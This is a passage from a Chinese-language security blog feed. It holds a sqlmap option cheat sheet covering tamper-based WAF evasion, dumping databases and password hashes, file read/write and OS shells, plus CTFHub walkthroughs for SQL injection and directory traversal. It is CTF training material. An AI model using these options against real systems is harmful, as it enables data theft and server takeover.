class="line">--proxy=PROXY 指定一个代理。</span><br><span class="line">例： --proxy=&quot;127.0.0.1:8080&quot; 使用GoAgent代理。</span><br></pre></td></tr></table></figure></p><h2 id="4-注入"><a href="#4-注入" class="headerlink" title="4.注入"></a>4.注入</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p  测试参数</span><br><span class="line">例：  sqlmap -r bp.txt -p &quot;username&quot;</span><br><span class="line">--skip-static  跳过测试静态参数(有的时候注入有多个参数，那么有些无关紧要的参数修改后页面是没有变化的)</span><br><span class="line">--no-cast  获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。(这个在我们注入失败的时候偶尔会见到，提示尝试使用--no-cast)</span><br><span class="line">--tamper=TAMPER 使用sqlmap自带的tamper，或者自己写的tamper，来混淆payload，通常用来绕过waf和ips。</span><br></pre></td></tr></table></figure><h2 id="5-检测"><a href="#5-检测" class="headerlink" title="5.检测"></a>5.检测</h2><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL  执行测试的等级（1-5，默认为1） </span><br><span class="line">lv2：cookie; lv3：user-agent，refere; lv5：host </span><br><span class="line">在sqlmap/xml/payloads文件内可以看见各个level发送的payload  我常使用--level 3</span><br><span class="line">--risk=RISK  执行测试的风险（0-3，默认为1） </span><br><span class="line">risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试</span><br><span class="line">升高风险等级会增加数据被篡改的风险。  常用就是默认1</span><br></pre></td></tr></table></figure></p><h2 id="6-枚举"><a href="#6-枚举" class="headerlink" title="6.枚举"></a>6.枚举</h2><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。 脱库时使用<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-b, --banner        获取数据库管理系统的标识</span><br><span class="line">--current-user      获取数据库管理系统当前用户</span><br><span class="line">--current-db        获取数据库管理系统当前数据库</span><br><span class="line">--hostname          获取数据库服务器的主机名称</span><br><span class="line">--is-dba            检测DBMS当前用户是否DBA</span><br><span class="line">--users             枚举数据库管理系统用户</span><br><span class="line">--passwords         枚举数据库管理系统用户密码哈希</span><br><span class="line">--privileges        枚举数据库管理系统用户的权限</span><br><span class="line">--dbs              枚举数据库管理系统数据库</span><br><span class="line">--tables           枚举DBMS数据库中的表</span><br><span class="line">--columns          枚举DBMS数据库表列</span><br><span class="line">-D                  要进行枚举的指定数据库名</span><br><span class="line">-T                  要进行枚举的指定表名</span><br><span class="line">-C                  要进行枚举的指定列名</span><br><span class="line">--dump             转储数据库表项,查询字段值</span><br><span class="line">--search           搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">--sql-query=QUERY   要执行的SQL语句</span><br><span class="line">--sql-shell         提示交互式SQL的shell</span><br></pre></td></tr></table></figure></p><h2 id="7-文件操作"><a href="#7-文件操作" class="headerlink" title="7.文件操作"></a>7.文件操作</h2><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--file-read=RFILE     从后端的数据库管理系统文件系统读取文件</span><br><span class="line">--file-write=WFILE    编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">--file-dest=DFILE     后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure></p><h2 id="8-操作系统访问"><a href="#8-操作系统访问" class="headerlink" title="8.操作系统访问"></a>8.操作系统访问</h2><p>这些选项可以用于访问后端数据库管理系统的底层操作系统<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=OSCMD      执行操作系统命令（OSCMD）</span><br><span class="line">--os-shell          交互式的操作系统的shell</span><br></pre></td></tr></table></figure></p><h1 id="sqlmap常规步骤"><a href="#sqlmap常规步骤" class="headerlink" title="sqlmap常规步骤"></a>sqlmap常规步骤</h1><p>例题（CTFhub<em>Web</em>报错注入）</p><h3 id="1-判断是否有注入"><a href="#1-判断是否有注入" class="headerlink" title="1.判断是否有注入"></a>1.判断是否有注入</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182213051.png" alt=""><br>（—batch表示自动判断）<br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182216335.png" alt=""></p><p>结果说明可以使用布尔盲注，报错注入，时间盲注</p><h3 id="2-查看所有数据库"><a href="#2-查看所有数据库" class="headerlink" title="2.查看所有数据库"></a>2.查看所有数据库</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182220637.png" alt=""><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182220834.png" alt=""><br>如图有四个数据库</p><h3 id="3-查看当前使用的数据库"><a href="#3-查看当前使用的数据库" class="headerlink" title="3.查看当前使用的数据库"></a>3.查看当前使用的数据库</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182223315.png" alt=""><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182223704.png" alt=""><br>得知当前使用的数据库名字为’sqli‘</p><h3 id="4-查看数据表"><a href="#4-查看数据表" class="headerlink" title="4.查看数据表"></a>4.查看数据表</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182225160.png" alt=""><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182226592.png" alt=""><br>当前数据库有两个表名为’flag‘和’news‘</p><h3 id="5-查看列名"><a href="#5-查看列名" class="headerlink" title="5.查看列名"></a>5.查看列名</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182228662.png" alt=""><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182228222.png" alt=""><br>如图有名为flag的列应该是flag</p><h3 id="6-查看数据"><a href="#6-查看数据" class="headerlink" title="6.查看数据"></a>6.查看数据</h3><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182230607.png" alt=""><br><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210182231606.png" alt=""><br>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqlmap是什么&quot;&gt;&lt;a href=&quot;#sqlmap是什么&quot; class=&quot;headerlink&quot; title=&quot;sqlmap是什么&quot;&gt;&lt;/a&gt;sqlmap是什么&lt;/h1&gt;&lt;p&gt;sqlmap是一个自动化的sql注入工具，其主要功能是扫描，发现并利用给定的URL和</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_信息泄露_目录遍历</title>
    <link href="https://guuuuq.github.io/posts/84b870c6.html"/>
    <id>https://guuuuq.github.io/posts/84b870c6.html</id>
    <published>2022-10-17T18:28:21.000Z</published>
    <updated>2022-12-16T07:47:06.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是目录遍历"><a href="#什么是目录遍历" class="headerlink" title="什么是目录遍历"></a>什么是目录遍历</h1><p>目录遍历（也称为文件路径遍历）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。这可能包括应用程序代码和数据，后端系统的凭据以及敏感的操作系统文件。在某些情况下，攻击者可能能够在服务器上写入任意文件，从而允许他们修改应用程序数据或行为，并最终完全控制服务器。</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>访问靶机</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/20221017175707.png" alt=""></p><p>F12后并未发现什么有用信息</p><p>点击“点击开始寻找flag”</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/20221017180255.png" alt=""></p><p>遍历在4/4处得到flag.txt</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/20221017180445.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是目录遍历&quot;&gt;&lt;a href=&quot;#什么是目录遍历&quot; class=&quot;headerlink&quot; title=&quot;什么是目录遍历&quot;&gt;&lt;/a&gt;什么是目录遍历&lt;/h1&gt;&lt;p&gt;目录遍历（也称为文件路径遍历）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的</summary>
      
    
    
    
    
  </entry>
  
</feed>
